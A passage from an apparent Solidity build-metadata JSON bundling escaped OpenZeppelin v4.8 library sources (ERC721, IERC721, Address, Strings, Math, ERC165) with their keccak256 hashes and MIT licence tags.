impossible.\\n            _balances[from] -= 1;\\n            _balances[to] += 1;\\n        }\\n        _owners[tokenId] = to;\\n\\n        emit Transfer(from, to, tokenId);\\n\\n        _afterTokenTransfer(from, to, tokenId, 1);\\n    }\\n\\n    /**\\n     * @dev Approve `to` to operate on `tokenId`\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function _approve(address to, uint256 tokenId) internal virtual {\\n        _tokenApprovals[tokenId] = to;\\n        emit Approval(ERC721.ownerOf(tokenId), to, tokenId);\\n    }\\n\\n    /**\\n     * @dev Approve `operator` to operate on all of `owner` tokens\\n     *\\n     * Emits an {ApprovalForAll} event.\\n     */\\n    function _setApprovalForAll(\\n        address owner,\\n        address operator,\\n        bool approved\\n    ) internal virtual {\\n        require(owner != operator, \\\"ERC721: approve to caller\\\");\\n        _operatorApprovals[owner][operator] = approved;\\n        emit ApprovalForAll(owner, operator, approved);\\n    }\\n\\n    /**\\n     * @dev Reverts if the `tokenId` has not been minted yet.\\n     */\\n    function _requireMinted(uint256 tokenId) internal view virtual {\\n        require(_exists(tokenId), \\\"ERC721: invalid token ID\\\");\\n    }\\n\\n    /**\\n     * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.\\n     * The call is not executed if the target address is not a contract.\\n     *\\n     * @param from address representing the previous owner of the given token ID\\n     * @param to target address that will receive the tokens\\n     * @param tokenId uint256 ID of the token to be transferred\\n     * @param data bytes optional data to send along with the call\\n     * @return bool whether the call correctly returned the expected magic value\\n     */\\n    function _checkOnERC721Received(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes memory data\\n    ) private returns (bool) {\\n        if (to.isContract()) {\\n            try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, data) returns (bytes4 retval) {\\n                return retval == IERC721Receiver.onERC721Received.selector;\\n            } catch (bytes memory reason) {\\n                if (reason.length == 0) {\\n                    revert(\\\"ERC721: transfer to non ERC721Receiver implementer\\\");\\n                } else {\\n                    /// @solidity memory-safe-assembly\\n                    assembly {\\n                        revert(add(32, reason), mload(reason))\\n                    }\\n                }\\n            }\\n        } else {\\n            return true;\\n        }\\n    }\\n\\n    /**\\n     * @dev Hook that is called before any token transfer. This includes minting and burning. If {ERC721Consecutive} is\\n     * used, the hook may be called as part of a consecutive (batch) mint, as indicated by `batchSize` greater than 1.\\n     *\\n     * Calling conditions:\\n     *\\n     * - When `from` and `to` are both non-zero, ``from``'s tokens will be transferred to `to`.\\n     * - When `from` is zero, the tokens will be minted for `to`.\\n     * - When `to` is zero, ``from``'s tokens will be burned.\\n     * - `from` and `to` are never both zero.\\n     * - `batchSize` is non-zero.\\n     *\\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\\n     */\\n    function _beforeTokenTransfer(\\n        address from,\\n        address to,\\n        uint256, /* firstTokenId */\\n        uint256 batchSize\\n    ) internal virtual {\\n        if (batchSize > 1) {\\n            if (from != address(0)) {\\n                _balances[from] -= batchSize;\\n            }\\n            if (to != address(0)) {\\n                _balances[to] += batchSize;\\n            }\\n        }\\n    }\\n\\n    /**\\n     * @dev Hook that is called after any token transfer. This includes minting and burning. If {ERC721Consecutive} is\\n     * used, the hook may be called as part of a consecutive (batch) mint, as indicated by `batchSize` greater than 1.\\n     *\\n     * Calling conditions:\\n     *\\n     * - When `from` and `to` are both non-zero, ``from``'s tokens were transferred to `to`.\\n     * - When `from` is zero, the tokens were minted for `to`.\\n     * - When `to` is zero, ``from``'s tokens were burned.\\n     * - `from` and `to` are never both zero.\\n     * - `batchSize` is non-zero.\\n     *\\n     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].\\n     */\\n    function _afterTokenTransfer(\\n        address from,\\n        address to,\\n        uint256 firstTokenId,\\n        uint256 batchSize\\n    ) internal virtual {}\\n}\\n\",\"keccak256\":\"0xd89f3585b211fc9e3408384a4c4efdc3a93b2f877a3821046fa01c219d35be1b\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC721/IERC721.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC721/IERC721.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../../utils/introspection/IERC165.sol\\\";\\n\\n/**\\n * @dev Required interface of an ERC721 compliant contract.\\n */\\ninterface IERC721 is IERC165 {\\n    /**\\n     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.\\n     */\\n    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);\\n\\n    /**\\n     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.\\n     */\\n    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);\\n\\n    /**\\n     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.\\n     */\\n    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);\\n\\n    /**\\n     * @dev Returns the number of tokens in ``owner``'s account.\\n     */\\n    function balanceOf(address owner) external view returns (uint256 balance);\\n\\n    /**\\n     * @dev Returns the owner of the `tokenId` token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function ownerOf(uint256 tokenId) external view returns (address owner);\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId,\\n        bytes calldata data\\n    ) external;\\n\\n    /**\\n     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients\\n     * are aware of the ERC721 protocol to prevent tokens from being forever locked.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must exist and be owned by `from`.\\n     * - If the caller is not `from`, it must have been allowed to move this token by either {approve} or {setApprovalForAll}.\\n     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function safeTransferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) external;\\n\\n    /**\\n     * @dev Transfers `tokenId` token from `from` to `to`.\\n     *\\n     * WARNING: Note that the caller is responsible to confirm that the recipient is capable of receiving ERC721\\n     * or else they may be permanently lost. Usage of {safeTransferFrom} prevents loss, though the caller must\\n     * understand this adds an external call which potentially creates a reentrancy vulnerability.\\n     *\\n     * Requirements:\\n     *\\n     * - `from` cannot be the zero address.\\n     * - `to` cannot be the zero address.\\n     * - `tokenId` token must be owned by `from`.\\n     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.\\n     *\\n     * Emits a {Transfer} event.\\n     */\\n    function transferFrom(\\n        address from,\\n        address to,\\n        uint256 tokenId\\n    ) external;\\n\\n    /**\\n     * @dev Gives permission to `to` to transfer `tokenId` token to another account.\\n     * The approval is cleared when the token is transferred.\\n     *\\n     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.\\n     *\\n     * Requirements:\\n     *\\n     * - The caller must own the token or be an approved operator.\\n     * - `tokenId` must exist.\\n     *\\n     * Emits an {Approval} event.\\n     */\\n    function approve(address to, uint256 tokenId) external;\\n\\n    /**\\n     * @dev Approve or remove `operator` as an operator for the caller.\\n     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.\\n     *\\n     * Requirements:\\n     *\\n     * - The `operator` cannot be the caller.\\n     *\\n     * Emits an {ApprovalForAll} event.\\n     */\\n    function setApprovalForAll(address operator, bool _approved) external;\\n\\n    /**\\n     * @dev Returns the account approved for `tokenId` token.\\n     *\\n     * Requirements:\\n     *\\n     * - `tokenId` must exist.\\n     */\\n    function getApproved(uint256 tokenId) external view returns (address operator);\\n\\n    /**\\n     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.\\n     *\\n     * See {setApprovalForAll}\\n     */\\n    function isApprovedForAll(address owner, address operator) external view returns (bool);\\n}\\n\",\"keccak256\":\"0xab28a56179c1db258c9bf5235b382698cb650debecb51b23d12be9e241374b68\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @title ERC721 token receiver interface\\n * @dev Interface for any contract that wants to support safeTransfers\\n * from ERC721 asset contracts.\\n */\\ninterface IERC721Receiver {\\n    /**\\n     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}\\n     * by `operator` from `from`, this function is called.\\n     *\\n     * It must return its Solidity selector to confirm the token transfer.\\n     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.\\n     *\\n     * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.\\n     */\\n    function onERC721Received(\\n        address operator,\\n        address from,\\n        uint256 tokenId,\\n        bytes calldata data\\n    ) external returns (bytes4);\\n}\\n\",\"keccak256\":\"0xa82b58eca1ee256be466e536706850163d2ec7821945abd6b4778cfb3bee37da\",\"license\":\"MIT\"},\"@openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"../IERC721.sol\\\";\\n\\n/**\\n * @title ERC-721 Non-Fungible Token Standard, optional metadata extension\\n * @dev See https://eips.ethereum.org/EIPS/eip-721\\n */\\ninterface IERC721Metadata is IERC721 {\\n    /**\\n     * @dev Returns the token collection name.\\n     */\\n    function name() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the token collection symbol.\\n     */\\n    function symbol() external view returns (string memory);\\n\\n    /**\\n     * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.\\n     */\\n    function tokenURI(uint256 tokenId) external view returns (string memory);\\n}\\n\",\"keccak256\":\"0x75b829ff2f26c14355d1cba20e16fe7b29ca58eb5fef665ede48bc0f9c6c74b9\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Address.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/Address.sol)\\n\\npragma solidity ^0.8.1;\\n\\n/**\\n * @dev Collection of functions related to the address type\\n */\\nlibrary Address {\\n    /**\\n     * @dev Returns true if `account` is a contract.\\n     *\\n     * [IMPORTANT]\\n     * ====\\n     * It is unsafe to assume that an address for which this function returns\\n     * false is an externally-owned account (EOA) and not a contract.\\n     *\\n     * Among others, `isContract` will return false for the following\\n     * types of addresses:\\n     *\\n     *  - an externally-owned account\\n     *  - a contract in construction\\n     *  - an address where a contract will be created\\n     *  - an address where a contract lived, but was destroyed\\n     * ====\\n     *\\n     * [IMPORTANT]\\n     * ====\\n     * You shouldn't rely on `isContract` to protect against flash loan attacks!\\n     *\\n     * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets\\n     * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract\\n     * constructor.\\n     * ====\\n     */\\n    function isContract(address account) internal view returns (bool) {\\n        // This method relies on extcodesize/address.code.length, which returns 0\\n        // for contracts in construction, since the code is only stored at the end\\n        // of the constructor execution.\\n\\n        return account.code.length > 0;\\n    }\\n\\n    /**\\n     * @dev Replacement for Solidity's `transfer`: sends `amount` wei to\\n     * `recipient`, forwarding all available gas and reverting on errors.\\n     *\\n     * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost\\n     * of certain opcodes, possibly making contracts go over the 2300 gas limit\\n     * imposed by `transfer`, making them unable to receive funds via\\n     * `transfer`. {sendValue} removes this limitation.\\n     *\\n     * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].\\n     *\\n     * IMPORTANT: because control is transferred to `recipient`, care must be\\n     * taken to not create reentrancy vulnerabilities. Consider using\\n     * {ReentrancyGuard} or the\\n     * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].\\n     */\\n    function sendValue(address payable recipient, uint256 amount) internal {\\n        require(address(this).balance >= amount, \\\"Address: insufficient balance\\\");\\n\\n        (bool success, ) = recipient.call{value: amount}(\\\"\\\");\\n        require(success, \\\"Address: unable to send value, recipient may have reverted\\\");\\n    }\\n\\n    /**\\n     * @dev Performs a Solidity function call using a low level `call`. A\\n     * plain `call` is an unsafe replacement for a function call: use this\\n     * function instead.\\n     *\\n     * If `target` reverts with a revert reason, it is bubbled up by this\\n     * function (like regular Solidity function calls).\\n     *\\n     * Returns the raw returned data. To convert to the expected return value,\\n     * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].\\n     *\\n     * Requirements:\\n     *\\n     * - `target` must be a contract.\\n     * - calling `target` with `data` must not revert.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCall(address target, bytes memory data) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, 0, \\\"Address: low-level call failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with\\n     * `errorMessage` as a fallback revert reason when `target` reverts.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, 0, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but also transferring `value` wei to `target`.\\n     *\\n     * Requirements:\\n     *\\n     * - the calling contract must have an ETH balance of at least `value`.\\n     * - the called Solidity function must be `payable`.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCallWithValue(\\n        address target,\\n        bytes memory data,\\n        uint256 value\\n    ) internal returns (bytes memory) {\\n        return functionCallWithValue(target, data, value, \\\"Address: low-level call with value failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but\\n     * with `errorMessage` as a fallback revert reason when `target` reverts.\\n     *\\n     * _Available since v3.1._\\n     */\\n    function functionCallWithValue(\\n        address target,\\n        bytes memory data,\\n        uint256 value,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        require(address(this).balance >= value, \\\"Address: insufficient balance for call\\\");\\n        (bool success, bytes memory returndata) = target.call{value: value}(data);\\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but performing a static call.\\n     *\\n     * _Available since v3.3._\\n     */\\n    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {\\n        return functionStaticCall(target, data, \\\"Address: low-level static call failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\\n     * but performing a static call.\\n     *\\n     * _Available since v3.3._\\n     */\\n    function functionStaticCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal view returns (bytes memory) {\\n        (bool success, bytes memory returndata) = target.staticcall(data);\\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],\\n     * but performing a delegate call.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {\\n        return functionDelegateCall(target, data, \\\"Address: low-level delegate call failed\\\");\\n    }\\n\\n    /**\\n     * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],\\n     * but performing a delegate call.\\n     *\\n     * _Available since v3.4._\\n     */\\n    function functionDelegateCall(\\n        address target,\\n        bytes memory data,\\n        string memory errorMessage\\n    ) internal returns (bytes memory) {\\n        (bool success, bytes memory returndata) = target.delegatecall(data);\\n        return verifyCallResultFromTarget(target, success, returndata, errorMessage);\\n    }\\n\\n    /**\\n     * @dev Tool to verify that a low level call to smart-contract was successful, and revert (either by bubbling\\n     * the revert reason or using the provided one) in case of unsuccessful call or if target was not a contract.\\n     *\\n     * _Available since v4.8._\\n     */\\n    function verifyCallResultFromTarget(\\n        address target,\\n        bool success,\\n        bytes memory returndata,\\n        string memory errorMessage\\n    ) internal view returns (bytes memory) {\\n        if (success) {\\n            if (returndata.length == 0) {\\n                // only check isContract if the call was successful and the return data is empty\\n                // otherwise we already know that it was a contract\\n                require(isContract(target), \\\"Address: call to non-contract\\\");\\n            }\\n            return returndata;\\n        } else {\\n            _revert(returndata, errorMessage);\\n        }\\n    }\\n\\n    /**\\n     * @dev Tool to verify that a low level call was successful, and revert if it wasn't, either by bubbling the\\n     * revert reason or using the provided one.\\n     *\\n     * _Available since v4.3._\\n     */\\n    function verifyCallResult(\\n        bool success,\\n        bytes memory returndata,\\n        string memory errorMessage\\n    ) internal pure returns (bytes memory) {\\n        if (success) {\\n            return returndata;\\n        } else {\\n            _revert(returndata, errorMessage);\\n        }\\n    }\\n\\n    function _revert(bytes memory returndata, string memory errorMessage) private pure {\\n        // Look for revert reason and bubble it up if present\\n        if (returndata.length > 0) {\\n            // The easiest way to bubble the revert reason is using memory via assembly\\n            /// @solidity memory-safe-assembly\\n            assembly {\\n                let returndata_size := mload(returndata)\\n                revert(add(32, returndata), returndata_size)\\n            }\\n        } else {\\n            revert(errorMessage);\\n        }\\n    }\\n}\\n\",\"keccak256\":\"0xf96f969e24029d43d0df89e59d365f277021dac62b48e1c1e3ebe0acdd7f1ca1\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Context.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Provides information about the current execution context, including the\\n * sender of the transaction and its data. While these are generally available\\n * via msg.sender and msg.data, they should not be accessed in such a direct\\n * manner, since when dealing with meta-transactions the account sending and\\n * paying for execution may not be the actual sender (as far as an application\\n * is concerned).\\n *\\n * This contract is only required for intermediate, library-like contracts.\\n */\\nabstract contract Context {\\n    function _msgSender() internal view virtual returns (address) {\\n        return msg.sender;\\n    }\\n\\n    function _msgData() internal view virtual returns (bytes calldata) {\\n        return msg.data;\\n    }\\n}\\n\",\"keccak256\":\"0xe2e337e6dde9ef6b680e07338c493ebea1b5fd09b43424112868e9cc1706bca7\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/Strings.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/Strings.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./math/Math.sol\\\";\\n\\n/**\\n * @dev String operations.\\n */\\nlibrary Strings {\\n    bytes16 private constant _SYMBOLS = \\\"0123456789abcdef\\\";\\n    uint8 private constant _ADDRESS_LENGTH = 20;\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` decimal representation.\\n     */\\n    function toString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            uint256 length = Math.log10(value) + 1;\\n            string memory buffer = new string(length);\\n            uint256 ptr;\\n            /// @solidity memory-safe-assembly\\n            assembly {\\n                ptr := add(buffer, add(32, length))\\n            }\\n            while (true) {\\n                ptr--;\\n                /// @solidity memory-safe-assembly\\n                assembly {\\n                    mstore8(ptr, byte(mod(value, 10), _SYMBOLS))\\n                }\\n                value /= 10;\\n                if (value == 0) break;\\n            }\\n            return buffer;\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.\\n     */\\n    function toHexString(uint256 value) internal pure returns (string memory) {\\n        unchecked {\\n            return toHexString(value, Math.log256(value) + 1);\\n        }\\n    }\\n\\n    /**\\n     * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.\\n     */\\n    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {\\n        bytes memory buffer = new bytes(2 * length + 2);\\n        buffer[0] = \\\"0\\\";\\n        buffer[1] = \\\"x\\\";\\n        for (uint256 i = 2 * length + 1; i > 1; --i) {\\n            buffer[i] = _SYMBOLS[value & 0xf];\\n            value >>= 4;\\n        }\\n        require(value == 0, \\\"Strings: hex length insufficient\\\");\\n        return string(buffer);\\n    }\\n\\n    /**\\n     * @dev Converts an `address` with fixed length of 20 bytes to its not checksummed ASCII `string` hexadecimal representation.\\n     */\\n    function toHexString(address addr) internal pure returns (string memory) {\\n        return toHexString(uint256(uint160(addr)), _ADDRESS_LENGTH);\\n    }\\n}\\n\",\"keccak256\":\"0xa4d1d62251f8574deb032a35fc948386a9b4de74b812d4f545a1ac120486b48a\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/introspection/ERC165.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)\\n\\npragma solidity ^0.8.0;\\n\\nimport \\\"./IERC165.sol\\\";\\n\\n/**\\n * @dev Implementation of the {IERC165} interface.\\n *\\n * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check\\n * for the additional interface id that will be supported. For example:\\n *\\n * ```solidity\\n * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\\n *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);\\n * }\\n * ```\\n *\\n * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.\\n */\\nabstract contract ERC165 is IERC165 {\\n    /**\\n     * @dev See {IERC165-supportsInterface}.\\n     */\\n    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {\\n        return interfaceId == type(IERC165).interfaceId;\\n    }\\n}\\n\",\"keccak256\":\"0xd10975de010d89fd1c78dc5e8a9a7e7f496198085c151648f20cba166b32582b\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/introspection/IERC165.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Interface of the ERC165 standard, as defined in the\\n * https://eips.ethereum.org/EIPS/eip-165[EIP].\\n *\\n * Implementers can declare support of contract interfaces, which can then be\\n * queried by others ({ERC165Checker}).\\n *\\n * For an implementation, see {ERC165}.\\n */\\ninterface IERC165 {\\n    /**\\n     * @dev Returns true if this contract implements the interface defined by\\n     * `interfaceId`. See the corresponding\\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\\n     * to learn more about how these ids are created.\\n     *\\n     * This function call must use less than 30 000 gas.\\n     */\\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\\n}\\n\",\"keccak256\":\"0x447a5f3ddc18419d41ff92b3773fb86471b1db25773e07f877f548918a185bf1\",\"license\":\"MIT\"},\"@openzeppelin/contracts/utils/math/Math.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\n// OpenZeppelin Contracts (last updated v4.8.0) (utils/math/Math.sol)\\n\\npragma solidity ^0.8.0;\\n\\n/**\\n * @dev Standard math utilities missing in the Solidity language.\\n */\\nlibrary Math {\\n    enum Rounding {\\n        Down, // Toward negative infinity\\n        Up, // Toward infinity\\n        Zero // Toward zero\\n    }\\n\\n    /**\\n     * @dev Returns the largest of two numbers.\\n     */\\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a > b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the smallest of two numbers.\\n     */\\n    function min(uint256 a, uint256 b) internal pure returns (uint256) {\\n        return a < b ? a : b;\\n    }\\n\\n    /**\\n     * @dev Returns the average of two numbers. The result is rounded towards\\n     * zero.\\n     */\\n    function average(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b) / 2 can overflow.\\n        return (a & b) + (a ^ b) / 2;\\n    }\\n\\n    /**\\n     * @dev Returns the ceiling of the division of two numbers.\\n     *\\n     * This differs from standard division with `/` in that it rounds up instead\\n     * of rounding down.\\n     */\\n    function ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // (a + b - 1) / b can overflow on addition, so we distribute.\\n        return a == 0 ? 0 : (a - 1) / b + 1;\\n    }\\n\\n    /**\\n     * @notice Calculates floor(x * y / denominator) with full precision. Throws if result overflows a uint256 or denominator == 0\\n     * @dev Original credit to Remco Bloemen under MIT license (https://xn--2-umb.com/21/muldiv)\\n     * with further edits by Uniswap Labs also under MIT license.\\n     */\\n    function mulDiv(\\n        uint256 x,\\n        uint256 y,\\n        uint256 denominator\\n    ) internal pure returns (uint256 result) {\\n        unchecked {\\n            // 512-bit multiply [prod1 prod0] = x * y. Compute the product mod 2^256 and mod 2^256 - 1, then use\\n            // use the Chinese Remainder Theorem to reconstruct the 512 bit result. The result is stored in two 256\\n            // variables such that product = prod1 * 2^256 + prod0.\\n            uint256 prod0; // Least significant 256 bits of the product\\n            uint256 prod1; // Most significant 256 bits of the product\\n            assembly {\\n                let mm := mulmod(x, y, not(0))\\n                prod0 := mul(x, y)\\n                prod1 := sub(sub(mm, prod0), lt(mm, prod0))\\n            }\\n\\n            // Handle non-overflow cases, 256 by 256 division.\\n            if (prod1 == 0) {\\n                return prod0 / denominator;\\n            }\\n\\n            // Make sure the result is less than 2^256. Also prevents denominator == 0.\\n            require(denominator > prod1);\\n\\n            ///////////////////////////////////////////////\\n            // 512 by 256 division.\\n            ///////////////////////////////////////////////\\n\\n            // Make division exact by subtracting the remainder from [prod1 prod0].\\n            uint256 remainder;\\n            assembly {\\n                // Compute remainder using mulmod.\\n                remainder := mulmod(x, y, denominator)\\n\\n                // Subtract 256 bit number from 512 bit number.\\n                prod1 := sub(prod1, gt(remainder, prod0))\\n                prod0 := sub(prod0, remainder)\\n            }\\n\\n            // Factor powers of two out of denominator and compute largest power of two divisor of denominator. Always >= 1.\\n            // See https://cs.stackexchange.com/q/138556/92363.\\n\\n            // Does not overflow because the denominator cannot be zero at this stage in the function.\\n            uint256 twos = denominator & (~denominator + 1);\\n            assembly {\\n                // Divide denominator by twos.\\n                denominator := div(denominator, twos)\\n\\n                // Divide [prod1 prod0] by twos.\\n                prod0 := div(prod0, twos)\\n\\n                // Flip twos such that it is 2^256 / twos. If twos is zero, then it becomes one.\\n                twos := add(div(sub(0, twos), twos), 1)\\n            }\\n\\n            // Shift in bits from prod1 into prod0.\\n            prod0 |= prod1 * twos;\\n\\n            // Invert denominator mod 2^256. Now that denominator is an odd number, it has an inverse modulo 2^256 such\\n            // that denominator * inv = 1 mod 2^256. Compute the inverse by starting with a seed that is correct for\\n            // four bits. That is, denominator * inv = 1 mod 2^4.\\n            uint256 inverse = (3 * denominator) ^ 2;\\n\\n            // Use the Newton-Raphson iteration to improve the precision. Thanks to Hensel's lifting lemma, this also works\\n            // in modular arithmetic, doubling the correct bits in each step.\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^8\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^16\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^32\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^64\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^128\\n            inverse *= 2 - denominator * inverse; // inverse mod 2^256\\n\\n            // Because the division is now exact we can divide by multiplying with the modular inverse of denominator.\\n            // This will give us the correct result modulo 2^256. Since the preconditions guarantee that the outcome is\\n            // less than 2^256, this is the final result. We don't need to compute the high bits of the result and prod1\\n            // is no longer required.\\n            result = prod0 * inverse;\\n            return result;\\n        }\\n    }\\n\\n    /**\\n     * @notice Calculates x * y / denominator with full precision, following the selected rounding direction.\\n     */\\n    function mulDiv(\\n        uint256 x,\\n        uint256 y,\\n        uint256 denominator,\\n        Rounding rounding\\n    ) internal pure returns (uint256) {\\n        uint256 result = mulDiv(x, y, denominator);\\n        if (rounding == Rounding.Up && mulmod(x, y, denominator) > 0) {\\n            result += 1;\\n        }\\n        return result;\\n    }\\n\\n    /**\\n     * @dev Returns the square root of a number. If the number is not a perfect square, the value is rounded down.\\n     *\\n     * Inspired by Henry S. Warren, Jr.'s \\\"Hacker's Delight\\\" (Chapter 11).\\n     */\\n    function sqrt(uint256 a) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n\\n        // For our first guess, we get the biggest power of 2 which is smaller than the square root of the target.\\n        //\\n        // We know that the \\\"msb\\\" (most significant bit) of our target number `a` is a power of 2 such that we have\\n        // `msb(a) <= a < 2*msb(a)`. This value can be written `msb(a)=2**k` with `k=log2(a)`.\\n        //\\n        // This can be rewritten `2**log2(a) <= a < 2**(log2(a) + 1)`\\n        // \\u2192 `sqrt(2**k) <= sqrt(a) < sqrt(2**(k+1))`\\n        // \\u2192 `2**(k/2) <= sqrt(a) < 2**((k+1)/2) <= 2**(k/2 + 1)`\\n        //\\n        // Consequently, `2**(log2(a) / 2)` is a good first approximation of `sqrt(a)` with at least 1 correct bit.\\n        uint256 result = 1 << (log2(a) >> 1);\\n\\n        // At this point `result` is an estimation with one bit of precision. We know the true value is a uint128,\\n        // since it is the square root of a uint256. Newton's method converges quadratically (precision doubles at\\n        // every iteration). We thus need at most 7 iteration to turn our partial result with one bit of precision\\n        // into the expected uint128 